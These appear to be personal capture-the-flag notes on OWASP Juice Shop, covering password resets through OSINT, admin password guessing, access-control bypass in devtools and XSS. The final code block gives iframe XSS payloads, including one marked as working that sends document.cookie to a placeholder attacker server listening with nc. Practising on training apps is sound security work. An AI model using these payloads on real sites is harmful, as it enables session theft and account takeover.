# Broken authen
## Jim reset password
- jim@juice-sh.op
- check all review in the shop and google more about him
  - https://en.wikipedia.org/wiki/James_T._Kirk
  - James Kirk's brother, George Samuel Kirk, is first mentioned in 
## admin password...
just try easy well know password
# Sensitive Data Exposure
- /#/about
- something interesting in `legel.md` download link
# Broken Access Control 
1. Access the administration section of the store - What is the name of the page?
  - open devtool and check main.js
  - search for `admin`
2. devtool -> Storage -> user session storage
3. go to administration section and remove it
# XSS
- find iframe tag payload


# bonus track
just me try to learn how to craft xss for sending cookie to my server (nc)
```js
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<IFRAME SRC="javascript:alert(document.cookie);"></IFRAME>

'http://<ip>:<port>/?cookie=' + encodeURI(document.cookie);

<IFRAME SRC="javascript:document.location='http://<ip>:<port>/?cookie='+document.cookie;"></IFRAME> // works
```